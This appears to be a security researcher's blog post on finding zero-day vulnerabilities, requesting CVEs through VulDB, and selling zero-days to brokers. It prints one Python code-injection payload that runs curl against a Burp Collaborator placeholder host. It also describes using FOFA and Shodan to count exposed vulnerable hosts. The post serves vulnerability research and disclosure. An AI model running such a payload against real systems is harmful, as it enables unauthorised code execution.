---
layout: post
title: "From Discovery to Reward: How to Find Zero-Day Vulnerabilities, Sell Them, and Obtain CVEs"
description: "Today, we will explore a crucial topic in the world of offensive security: zero-day vulnerabilities."
date:   2024-06-11 11:01:35 +0300
image:  '/images/514.jpg'
tags:   [enumeration, exploitation, cve]
---

Hello, hackers! Today, we will explore a crucial topic in the world of offensive security: zero-day vulnerabilities. We will discuss how to conduct research to identify these vulnerabilities, methodologies to stay one step ahead, and how to sell your zero-day or request a CVE for a vulnerability.

But first, let's understand what a zero-day vulnerability is.

#### Zero-Day
A zero-day vulnerability is a flaw discovered by attackers or researchers before the vendor becomes aware of it. Since the vendors are not aware of this vulnerability, there is no patch available, making them a true lethal weapon for cyberattacks.

These vulnerabilities are highly sought after by malicious hackers because they can cause massive damage, affecting numerous companies that use the vulnerable technology. The impact can be devastating, compromising sensitive data, disrupting operations, and resulting in substantial financial losses.

### My Journey with Zero-Day Vulnerabilities
A year ago, I realized that an effective way to gain recognition and demonstrate my skills was to find zero-day vulnerabilities, as they could become CVEs attributed to me. With this in mind, I started researching methods to identify these vulnerabilities and eventually achieve my first CVEs. However, I found it challenging to find resources that guided me along this path.

I persisted, getting hands-on and using enumeration techniques to identify potential software for research. This effort resulted in my first CVEs. So far, I have obtained a total of seven, with the most critical being: [CVE-2023-2043] and [CVE-2023-2524]. Some of these vulnerabilities were also discovered through Bug Bounty programs.

### How to Find Zero-Day Vulnerabilities and How I Discovered a Critical Code Injection Vulnerability
#### Step-by-Step Process:
1. Software Enumeration: Research and identify promising software.
2. Existing Vulnerability Check: Consult databases like exploit-db and NIST to ensure the chosen software does not have cataloged vulnerabilities.
3. Environment Setup and Software Installation: Set up the testing environment on a virtual machine and install the software.
4. Testing Until Vulnerability Identification: Conduct thorough tests on the application to detect anomalous behaviors.
5. Global Technology Usage Verification: Evaluate the technological implementation to understand the potential impact of the vulnerability.
6. Report/PoC Creation: Document the vulnerability in detail and create a Proof of Concept (PoC).
7. Submission: Report the vulnerability to the developer or the responsible platform.

### Software Enumeration
To start enumerating some software, I used several research methods, such as:

* Google Search:
Examples: "download management software", "download automation software".
This helps identify popular software in various categories.

![]({{site.baseurl}}/images/700.jpg)

* GitHub:
Use specific tags and dorks to find relevant software.

![]({{site.baseurl}}/images/701.jpg)


* Mitre CVE List:
Search for types of vulnerabilities or any other keyword.
https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=software

![]({{site.baseurl}}/images/702.jpg)


I focused on finding one that could be run locally via the web. After identifying a promising software, I checked for any known vulnerabilities using exploit-db and NIST. Finding no cataloged vulnerabilities, I downloaded and installed the software on my computer (I recommend using a VM to avoid compromising the host system).

### Testing and Discovery of the Vulnerability
With the application running, I began testing as in a typical web pentest. I conducted various injection attempts, including XSS and SQL Injection, and rigorously tested the application's access controls. During the normal use of the application, I carefully observed the requests made with each action.

After an intense day of testing, I noticed a parameter with suspicious values: a Python list containing specific strings. Knowing that the application used the Django framework, I started to explore this potential vulnerability more deeply. Through a series of detailed tests, I identified a critical Python Code Injection vulnerability.

> Code injection occurs when an attacker can execute arbitrary commands on the system by injecting them into a vulnerable program. This vulnerability arises when an application transmits unsafe user data (e.g., forms, cookies, and HTTP headers) to a system shell. Common scenarios include passing unsanitized input directly to system commands.
>

#### Exploitation Example:
![]({{site.baseurl}}/images/703.jpg)

To identify the vulnerability, I used a payload that imported the os library and executed a curl command pointing to my Burp Collaborator. The payload used was:

{% highlight js %}
    eval(compile("""for x in range(1):\n import os\n os.popen(r'curl http://BURPCOLLABORATOR').read()""",'','single'))
{% endhighlight %}

I injected this payload into the suspicious parameter. Upon checking the Burp Collaborator, I confirmed the receipt of the request, validating the existence of the vulnerability.

![]({{site.baseurl}}/images/704.jpg)

![]({{site.baseurl}}/images/705.jpg)

### Verification of Global Usage of the Affected Software
After discovering the vulnerability, I used the CVSS calculator to accurately determine its severity. With this metric in hand, I created a dork to identify the affected product using FOFA. Shodan can also be used for this purpose. Through these tools, I found that the product was present on over 2,000 exposed hosts on the internet.
* https://fofa.info/
* https://www.shodan.io/

![]({{site.baseurl}}/images/706.jpg)

![]({{site.baseurl}}/images/707.jpg)

### Report
With the vulnerability identified, I created a detailed Proof of Concept (PoC), describing the process of exploiting the vulnerability. The PoC is essential for documenting and communicating the discovery clearly and efficiently.

### Final Research Results
During the process of creating this post, I tested two software applications and discovered a total of eight vulnerabilities. Among them, I identified:
* 1x Python Code Injection vulnerability;
* 2x Privilege Escalation (PrivEsc) vulnerabilities;
* 5x Stored Cross-Site Scripting (XSS) vulnerabilities.


For these discovered vulnerabilities, I utilized two scenarios that will be presented in the next topic on Responsible Disclosure and Monetization of the Discovery.

### Next Steps After Discovering the Vulnerability
Now that you have identified the vulnerability, assessed its severity, and understood its global impact, you have two main options to proceed:

* Responsible Disclosure: Submit the Proof of Concept (PoC) to a vulnerability database (such as VulDB) and request the assignment of a CVE (Common Vulnerabilities and Exposures). This process helps officially catalog the vulnerability, allowing vendors to develop patches and the security community to take necessary actions to mitigate risks.
* Monetization of the Discovery: Submit your discovery to a Zero-Day incentive program that offers financial rewards for critical vulnerabilities. Programs like Zero Day Initiative (TrendMicro), Zerodium, and Crowdfense are among those that pay for unknown vulnerabilities affecting widely used technologies.

Both options contribute to cybersecurity in different ways, allowing you to choose between official recognition of your discovery and financial reward for your efforts.

#### Commercialization of Zero-Day Vulnerabilities
For critical vulnerabilities affecting a large number of hosts or specific technology, you might consider "selling" your Zero-Day to incentive programs that purchase these discoveries. Here is a list of "gray" markets that might be interested in acquiring your vulnerability:
* Zero Day Initiative (TrendMicro): This program offers rewards for unknown vulnerabilities affecting widely used products, helping to protect end-users by notifying vendors for patches (https://www.zerodayinitiative.com/).
![]({{site.baseurl}}/images/708.jpg)


* Zerodium: One of the most well-known in the industry, it offers significant payments for Zero-Day vulnerabilities across a wide range of platforms and devices. They have particular interest in exploits affecting operating systems, browsers, and mobile devices (https://www.zerodium.com/).
![]({{site.baseurl}}/images/709.jpg)


* Crowdfense: Specialized in acquiring high-value vulnerabilities, primarily focusing on cybersecurity, offering substantial rewards for exploits that can compromise critical systems (https://www.crowdfense.com/).
![]({{site.baseurl}}/images/710.jpg)


These programs not only provide financial compensation but also ensure that vulnerabilities are handled responsibly, helping to improve the overall security of affected systems. By choosing to sell your Zero-Day, you contribute to creating a safer digital environment while being fairly rewarded for your discoveries.

#### Requesting a CVE
For any critical vulnerability you find during your research, it is possible to request a CVE. To do this, I recommend using the VulDB platform (https://vuldb.com/).

1. Create an Account: Sign up on the platform.
2. Access the "Entries" Section: Navigate to "Entries" and click on "Add".
3. Fill in the Required Fields: Complete the fields according to the software or technology where the vulnerability was identified. 

In the example below, I submitted a Privilege Escalation vulnerability found during my research.

![]({{site.baseurl}}/images/711.jpg)

After filling in all the required fields and submitting the detailed description of the vulnerability, remember to check the box that says "Request a CVE". The VulDB team will review your submission and, within approximately two weeks, assign a CVE to you.

It is important to highlight that the VulDB team contacts the responsible software vendor to notify them about the newly discovered vulnerability.

Here is an example of how you will receive the notification that your vulnerability is valid and that you have been assigned a CVE:

![]({{site.baseurl}}/images/712.jpg)

### Conclusion
The pursuit of Zero-Day vulnerabilities not only provides recognition but also strengthens your resume, demonstrating that you possess relevant and valuable skills in Offensive Security. Participating in the discovery and disclosure of vulnerabilities enhances your credibility within the cybersecurity community and can open doors to new professional opportunities.

I hope you found this content useful and that it has helped you in some way. Until next time!